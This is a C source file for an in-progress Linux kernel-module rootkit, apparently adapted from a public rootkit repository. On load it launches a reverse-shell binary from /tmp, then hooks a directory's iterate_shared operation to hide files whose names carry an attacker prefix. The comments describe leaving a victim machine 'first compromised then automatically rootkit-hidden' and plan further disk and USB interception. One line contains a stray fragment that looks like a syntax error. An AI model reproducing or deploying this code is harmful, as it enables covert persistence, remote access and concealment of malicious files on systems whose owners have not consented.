// in-progress version B of lkm_exec.c

//References
// some code taken from (and modified) of `nisay759`'s linux-rootkits git repo.
// https://github.com/nisay759/linux-rootkits
// https://github.com/loneicewolf/linux-rootkits <-- used

// Docs coming very soon;
// questions can be posed to me as Mail or via Discord.


#include    <linux/init.h>
#include    <linux/kernel.h>
#include    <linux/module.h>
#include    <linux/namei.h>
#include    <linux/fs.h>
#include    <linux/proc_fs.h>

MODULE_LICENSE    ("GPL");
MODULE_AUTHOR     ("William Martens");
MODULE_VERSION    ("Major 2.0"); // XXX do not forget: update everything (docs, POCS, readme, VERSIONS)

static int __init   LHP_KERN_init(void)  ;   module_init (LHP_KERN_init);
static void __exit  LHP_KERN_exit(void)  ;   module_exit (LHP_KERN_exit);
static char *app    = "/tmp/RSH"         ;   module_param (app,    charp, S_IRUGO);
static char *prefix = "rk_"              ;   module_param (prefix, charp, S_IRUGO);
static char *kpath  = "/"                ;   module_param (kpath,  charp, S_IRUGO);

        struct    file_operations   proc_fops;
const   struct    file_operations  *backup_proc_fops;
        struct    inode            *proc_inode;
        struct    dir_context      *backup_ctx;

static int rk_filldir_t (
        struct    dir_context *ctx, 
    const char *file_name,
    int len,
    loff_t
    off,
    u64 ino,
    unsigned int d_type     ){
  if (strstr(file_name, prefix) != NULL)now -
          return 0;
  return backup_ctx->actor(backup_ctx, file_name, len, off, ino, d_type);
}

        struct    dir_context   rk_ctx = {.actor = rk_filldir_t};
int rk_iterate_shared (
        struct    file             *file,
        struct    dir_context      *ctx){
  int result  = 0;
  rk_ctx.pos  = ctx ->  pos;
  backup_ctx  = ctx;
  result      = backup_proc_fops  ->  iterate_shared  (file,  &rk_ctx);
    ctx -> pos  =   rk_ctx.pos;
  return result;
}

static int __init LHP_KERN_init(void){
         char *argv[] = {app, NULL};
  static char *env[]  = {"HOME=/",  "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
  call_usermodehelper(argv[0],  argv,  env, UMH_WAIT_PROC); // why do we do THIS first and THEN (below)
        struct    path    p;
  if(kern_path(kpath, 0, &p)) // <-- (above+below) -> load the rootkit-hiding plugin  ??
        return 0;
  proc_inode                 =  p.dentry   ->  d_inode;
  proc_fops                  = *proc_inode ->   i_fop;
  backup_proc_fops           =  proc_inode ->  i_fop;
  proc_fops.iterate_shared   =  rk_iterate_shared;
  proc_inode  ->  i_fop      =  &proc_fops;
  return 0;
} //                                                             it is because, you first want a reverse shell -> do some stuff(post enum/expl,..) then you can just exit it; (having named any malicious files that matches the prefix)
  // once you quit; the lkm's rev.shell(kernelmode rev.shell I should add!) is done and exits; but then the rootkit loads -> leaving the system in a "first compromised then automatically rootkit-hidden" kind of state.
  // More "choices" and "options" coming very soon. Like intercepting the SCSI commands from a disk/or USB. (to do firmware operations, since we are kernel mode in a LKM we can 'hook' some of this stuff)

static void __exit LHP_KERN_exit(void){ // of course if we exit the lkm (unload it) we really do not want any malicious things (so, the rootkit hiding plugin!) on the victims machine; this would be devastating. Not to mention illegal. (if we do a pentest and we are authorized to do so; we must still remove the *stuff* afterwards)
        struct     path    p;
        struct     inode   *proc_inode;
  if(kern_path(kpath, 0, &p))
      return;
  proc_inode                = p.dentry  ->  d_inode;
  proc_inode  ->  i_fop     = backup_proc_fops;
}
